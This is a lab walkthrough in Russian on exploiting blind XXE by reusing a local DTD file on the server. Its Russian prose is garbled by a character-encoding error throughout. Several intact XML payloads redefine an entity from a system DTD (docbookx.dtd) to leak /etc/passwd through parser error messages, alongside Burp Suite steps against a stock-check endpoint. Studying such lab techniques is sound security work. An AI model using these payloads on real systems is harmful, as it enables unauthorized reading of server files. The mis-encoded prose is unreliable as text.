# ‚ú® –≠–∫—Å–ø–ª—É–∞—Ç–∞—Ü–∏—è —Å–ª–µ–ø–æ–π XXE —Å –ø–æ–≤—Ç–æ—Ä–Ω—ã–º –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏–µ–º –ª–æ–∫–∞–ª—å–Ω–æ–≥–æ DTD ‚ú®

---

## üîé –ü–æ–Ω–∏–º–∞–Ω–∏–µ —Ç–µ—Ö–Ω–∏–∫–∏

–≠—Ç–∞ —Ç–µ—Ö–Ω–∏–∫–∞ –∏—Å–ø–æ–ª—å–∑—É–µ—Ç —É—è–∑–≤–∏–º–æ—Å—Ç–∏ —Å–ª–µ–ø–æ–≥–æ XXE, –∫–æ–≥–¥–∞ –≤–Ω–µ–ø–æ–ª–æ—Å–Ω—ã–µ (OOB) –≤–∑–∞–∏–º–æ–¥–µ–π—Å—Ç–≤–∏—è –±–ª–æ–∫–∏—Ä—É—é—Ç—Å—è. –û–Ω–∞ –≤–∫–ª—é—á–∞–µ—Ç:

- –ò—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏–µ –≥–∏–±—Ä–∏–¥–Ω—ã—Ö –≤–Ω—É—Ç—Ä–µ–Ω–Ω–∏—Ö –∏ –≤–Ω–µ—à–Ω–∏—Ö –¥–µ–∫–ª–∞—Ä–∞—Ü–∏–π DTD.
- –ü–æ–≤—Ç–æ—Ä–Ω–æ–µ –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏–µ –ª–æ–∫–∞–ª—å–Ω–æ–≥–æ —Ñ–∞–π–ª–∞ DTD –Ω–∞ —Å–µ—Ä–≤–µ—Ä–µ.
- –í—ã–∑–æ–≤ –æ—à–∏–±–æ–∫ —Å–∏–Ω—Ç–∞–∫—Å–∏—á–µ—Å–∫–æ–≥–æ –∞–Ω–∞–ª–∏–∑–∞ XML –¥–ª—è –∏–∑–≤–ª–µ—á–µ–Ω–∏—è –∫–æ–Ω—Ñ–∏–¥–µ–Ω—Ü–∏–∞–ª—å–Ω—ã—Ö –¥–∞–Ω–Ω—ã—Ö.

### –û—Å–Ω–æ–≤–Ω—ã–µ —Ö–∞—Ä–∞–∫—Ç–µ—Ä–∏—Å—Ç–∏–∫–∏:
1. –í–Ω–µ—à–Ω–∏–µ –¥–µ–∫–ª–∞—Ä–∞—Ü–∏–∏ DTD –Ω–µ –º–æ–≥—É—Ç –±—ã—Ç—å –∑–∞–≥—Ä—É–∂–µ–Ω—ã —Å —É–¥–∞–ª–µ–Ω–Ω—ã—Ö —Å–µ—Ä–≤–µ—Ä–æ–≤ –∏–∑-–∑–∞ –æ–≥—Ä–∞–Ω–∏—á–µ–Ω–∏–π OOB.
2. –í–Ω—É—Ç—Ä–µ–Ω–Ω–∏–µ DTD –º–æ–≥—É—Ç –ø–µ—Ä–µ–æ–ø—Ä–µ–¥–µ–ª—è—Ç—å —Å—É—â–Ω–æ—Å—Ç–∏ –∏–∑ –ª–æ–∫–∞–ª—å–Ω—ã—Ö –≤–Ω–µ—à–Ω–∏—Ö DTD.
3. –û—à–∏–±–∫–∏ —Å–∏–Ω—Ç–∞–∫—Å–∏—á–µ—Å–∫–æ–≥–æ –∞–Ω–∞–ª–∏–∑–∞ —Å–æ–¥–µ—Ä–∂–∞—Ç –∫–æ–Ω—Ñ–∏–¥–µ–Ω—Ü–∏–∞–ª—å–Ω—É—é –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏—é.

---

### –ü—Ä–∏–º–µ—Ä —Å—Ü–µ–Ω–∞—Ä–∏—è –∞—Ç–∞–∫–∏

–ü—Ä–µ–¥–ø–æ–ª–æ–∂–∏–º, —á—Ç–æ –ª–æ–∫–∞–ª—å–Ω—ã–π —Ñ–∞–π–ª DTD —Å—É—â–µ—Å—Ç–≤—É–µ—Ç –ø–æ –ø—É—Ç–∏ `/usr/local/app/schema.dtd` –∏ –æ–ø—Ä–µ–¥–µ–ª—è–µ—Ç —Å—É—â–Ω–æ—Å—Ç—å —Å –∏–º–µ–Ω–µ–º `custom_entity`. –ó–ª–æ—É–º—ã—à–ª–µ–Ω–Ω–∏–∫ –º–æ–∂–µ—Ç –≤–æ—Å–ø–æ–ª—å–∑–æ–≤–∞—Ç—å—Å—è —ç—Ç–∏–º, –æ—Ç–ø—Ä–∞–≤–∏–≤ —Å–ª–µ–¥—É—é—â–∏–π –ø–æ–ª–µ–∑–Ω—ã–π XML-–∫–æ–¥:

```xml
<!DOCTYPE foo [
<!ENTITY % local_dtd SYSTEM "file:///usr/local/app/schema.dtd">
<!ENTITY % custom_entity '
<!ENTITY &#x25; file SYSTEM "file:///etc/passwd">
<!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///nonexistent/&#x25;file;&#x27;>">
&#x25;eval;
&#x25;error;
'>
%local_dtd;
]>
```

### –®–∞–≥–∏:
1. **–û–ø—Ä–µ–¥–µ–ª–µ–Ω–∏–µ –ø–∞—Ä–∞–º–µ—Ç—Ä–∏—á–µ—Å–∫–æ–π —Å—É—â–Ω–æ—Å—Ç–∏** (`local_dtd`), —Å–æ–¥–µ—Ä–∂–∞—â–µ–π –ª–æ–∫–∞–ª—å–Ω—ã–π –≤–Ω–µ—à–Ω–∏–π DTD.
2. **–ü–µ—Ä–µ–æ–ø—Ä–µ–¥–µ–ª–µ–Ω–∏–µ –≤–Ω–µ—à–Ω–µ–π —Å—É—â–Ω–æ—Å—Ç–∏** (`custom_entity`) —Å –ø–æ–º–æ—â—å—é –≤—Ä–µ–¥–æ–Ω–æ—Å–Ω–æ–≥–æ –æ–ø—Ä–µ–¥–µ–ª–µ–Ω–∏—è.
3. **–ò—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏–µ –ø–µ—Ä–µ–æ–ø—Ä–µ–¥–µ–ª—ë–Ω–Ω–æ–π —Å—É—â–Ω–æ—Å—Ç–∏** —á–µ—Ä–µ–∑ –ø–∞—Ä–∞–º–µ—Ç—Ä `local_dtd`, —á—Ç–æ –≤—ã–∑—ã–≤–∞–µ—Ç –æ—à–∏–±–∫—É —Å–∏–Ω—Ç–∞–∫—Å–∏—á–µ—Å–∫–æ–≥–æ –∞–Ω–∞–ª–∏–∑–∞.

---

## üîß –ü–æ—à–∞–≥–æ–≤–æ–µ —Ä—É–∫–æ–≤–æ–¥—Å—Ç–≤–æ –ø–æ –ª–∞–±–æ—Ä–∞—Ç–æ—Ä–Ω–æ–π —Ä–∞–±–æ—Ç–µ

–í —ç—Ç–æ–π –ª–∞–±–æ—Ä–∞—Ç–æ—Ä–Ω–æ–π —Ä–∞–±–æ—Ç–µ –µ—Å—Ç—å —Ñ—É–Ω–∫—Ü–∏—è **"–ü—Ä–æ–≤–µ—Ä–∫–∞ –Ω–∞–ª–∏—á–∏—è –Ω–∞ —Å–∫–ª–∞–¥–µ"**, –∫–æ—Ç–æ—Ä–∞—è –∞–Ω–∞–ª–∏–∑–∏—Ä—É–µ—Ç –≤—Ö–æ–¥–Ω—ã–µ –¥–∞–Ω–Ω—ã–µ XML, –Ω–æ –Ω–µ –æ—Ç–æ–±—Ä–∞–∂–∞–µ—Ç —Ä–µ–∑—É–ª—å—Ç–∞—Ç—ã. –î–∞–≤–∞–π—Ç–µ –∏—Å–ø–æ–ª—å–∑—É–µ–º –µ—ë –¥–ª—è –∏–∑–≤–ª–µ—á–µ–Ω–∏—è —Å–æ–¥–µ—Ä–∂–∏–º–æ–≥–æ `/etc/passwd`:

---

### ‚úÖ –®–∞–≥ 1: –ü–µ—Ä–µ—Ö–æ–¥ –∫ –ø—Ä–æ–¥—É–∫—Ç—É

–ù–∞–π–¥–∏—Ç–µ —Å–ø–∏—Å–æ–∫ –ø—Ä–æ–¥—É–∫—Ç–æ–≤ –∏ –≤—ã–±–µ—Ä–∏—Ç–µ –ª—é–±–æ–π:

![–°–∫—Ä–∏–Ω—à–æ—Ç 1](https://github.com/user-attachments/assets/420f18e2-6900-4413-81f2-7cc5c6103444)

---

### ‚úÖ –®–∞–≥ 2: –í—ã–∑–æ–≤ –ø—Ä–æ–≤–µ—Ä–∫–∏ –Ω–∞–ª–∏—á–∏—è

–ü—Ä–æ–∫—Ä—É—Ç–∏—Ç–µ –≤–Ω–∏–∑ –∏ –Ω–∞–∂–º–∏—Ç–µ **"–ü—Ä–æ–≤–µ—Ä–∏—Ç—å –Ω–∞–ª–∏—á–∏–µ –Ω–∞ —Å–∫–ª–∞–¥–µ"**, –≤–∫–ª—é—á–∏–≤ Burp Proxy:

![–°–∫—Ä–∏–Ω—à–æ—Ç 2](https://github.com/user-attachments/assets/c12710e3-0520-47a9-b507-1bb41849a7df)

---

### ‚úÖ –®–∞–≥ 3: –ü–µ—Ä–µ—Ö–≤–∞—Ç –∑–∞–ø—Ä–æ—Å–∞

–í **Burp Suite** –æ—Ç–∫—Ä–æ–π—Ç–µ `Proxy -> HTTP History`, –Ω–∞–π–¥–∏—Ç–µ `POST`-–∑–∞–ø—Ä–æ—Å –∫ `/product/stock` –∏ –æ—Ç–ø—Ä–∞–≤—å—Ç–µ –µ–≥–æ –≤ **Repeater**:

![–°–∫—Ä–∏–Ω—à–æ—Ç 3](https://github.com/user-attachments/assets/f2febc3e-4ab7-441e-8fb3-04990746f99f)

---

### ‚úÖ –®–∞–≥ 4: –í—Å—Ç–∞–≤—å—Ç–µ –≤—Ä–µ–¥–æ–Ω–æ—Å–Ω—ã–π DTD

–ó–∞–º–µ–Ω–∏—Ç–µ –ø–æ–ª–µ–∑–Ω—É—é –Ω–∞–≥—Ä—É–∑–∫—É —Å–ª–µ–¥—É—é—â–∏–º –æ–ø—Ä–µ–¥–µ–ª–µ–Ω–∏–µ–º DTD:

```xml
<!DOCTYPE foo [
<!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd">
<!ENTITY % ISOamso '
<!ENTITY &#x25; file SYSTEM "file:///etc/passwd">
<!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///nonexistent/&#x25;file;&#x27;>">
&#x25;eval;
&#x25;error;
'>
%local_dtd;
]>
```

![–°–∫—Ä–∏–Ω—à–æ—Ç 4](https://github.com/user-attachments/assets/87784678-071c-4e1f-a766-b4add7e516cd)

---

### ‚úÖ –®–∞–≥ 5: –ò–∑–≤–ª–µ—á–µ–Ω–∏–µ –¥–∞–Ω–Ω—ã—Ö

–û—Ç–ø—Ä–∞–≤—å—Ç–µ –∑–∞–ø—Ä–æ—Å, —á—Ç–æ–±—ã –ø–æ–ª—É—á–∏—Ç—å —Å–æ–¥–µ—Ä–∂–∏–º–æ–µ `/etc/passwd` —á–µ—Ä–µ–∑ –≤—ã–≤–æ–¥ –æ—à–∏–±–∫–∏:

![–°–∫—Ä–∏–Ω—à–æ—Ç 5](https://github.com/user-attachments/assets/e6f9df34-6e44-46ea-81f9-16d3e6848ab3)

---

## üîç –ü–æ–∏—Å–∫ –ª–æ–∫–∞–ª—å–Ω–æ–≥–æ DTD –¥–ª—è –ø–æ–≤—Ç–æ—Ä–Ω–æ–≥–æ –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏—è

1. **–û–ø—Ä–µ–¥–µ–ª–∏—Ç–µ —Å—É—â–µ—Å—Ç–≤—É—é—â–∏–µ —Ñ–∞–π–ª—ã DTD:**
   - –ü—Ä–æ–≤–µ—Ä—å—Ç–µ –æ–±—â–∏–µ –ø—É—Ç–∏, —Ç–∞–∫–∏–µ –∫–∞–∫ `/usr/share/yelp/dtd/docbookx.dtd`.

2. **–ü—Ä–æ–≤–µ—Ä—å—Ç–µ –Ω–∞–ª–∏—á–∏–µ:**
   - –û—Ç–ø—Ä–∞–≤—å—Ç–µ –º–∏–Ω–∏–º–∞–ª—å–Ω—ã–π –∫–æ–¥ –¥–ª—è –ø—Ä–æ–≤–µ—Ä–∫–∏ –¥–æ—Å—Ç—É–ø–Ω–æ—Å—Ç–∏ —Ñ–∞–π–ª–∞:

```xml
<!DOCTYPE foo [
<!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd">
%local_dtd;
]>
```

3. **–ê–Ω–∞–ª–∏–∑–∏—Ä—É–π—Ç–µ DTD:**
   - –ù–∞–π–¥–∏—Ç–µ –æ—Ç–∫—Ä—ã—Ç—ã–µ –∫–æ–ø–∏–∏ —Ñ–∞–π–ª–æ–≤ DTD –≤ –∏–Ω—Ç–µ—Ä–Ω–µ—Ç–µ –¥–ª—è –ø–æ–∏—Å–∫–∞ —Å—É—â–Ω–æ—Å—Ç–µ–π, –∫–æ—Ç–æ—Ä—ã–µ –º–æ–∂–Ω–æ –ø–µ—Ä–µ–æ–ø—Ä–µ–¥–µ–ª–∏—Ç—å.

---

## üöÄ –ó–∞–∫–ª—é—á–µ–Ω–∏–µ

–≠—Ç–∞ –∞—Ç–∞–∫–∞ –¥–µ–º–æ–Ω—Å—Ç—Ä–∏—Ä—É–µ—Ç, –∫–∞–∫ —É—è–∑–≤–∏–º–æ—Å—Ç–∏ —Å–ª–µ–ø–æ–≥–æ XXE –º–æ–≥—É—Ç –±—ã—Ç—å –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω—ã –¥–∞–∂–µ –ø—Ä–∏ —Å—Ç—Ä–æ–≥–∏—Ö –æ–≥—Ä–∞–Ω–∏—á–µ–Ω–∏—è—Ö –Ω–∞ OOB-–≤–∑–∞–∏–º–æ–¥–µ–π—Å—Ç–≤–∏—è –ø—É—Ç—ë–º –ø–æ–≤—Ç–æ—Ä–Ω–æ–≥–æ –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏—è –ª–æ–∫–∞–ª—å–Ω—ã—Ö —Ñ–∞–π–ª–æ–≤ DTD –Ω–∞ —Å–µ—Ä–≤–µ—Ä–µ. –≠—Ç–æ –ø–æ–¥—á—ë—Ä–∫–∏–≤–∞–µ—Ç –≤–∞–∂–Ω–æ—Å—Ç—å:

- –û–≥—Ä–∞–Ω–∏—á–µ–Ω–∏—è –æ–±—Ä–∞–±–æ—Ç–∫–∏ DTD –≤ XML-–∞–Ω–∞–ª–∏–∑–∞—Ç–æ—Ä–∞—Ö.
- –û–≥—Ä–∞–Ω–∏—á–µ–Ω–∏—è –¥–æ—Å—Ç—É–ø–∞ —Å–µ—Ä–≤–µ—Ä–∞ –∫ –∫–æ–Ω—Ñ–∏–¥–µ–Ω—Ü–∏–∞–ª—å–Ω—ã–º —Ñ–∞–π–ª–∞–º.

–£–¥–∞—á–Ω—ã—Ö –∏—Å—Å–ª–µ–¥–æ–≤–∞–Ω–∏–π! üòâ
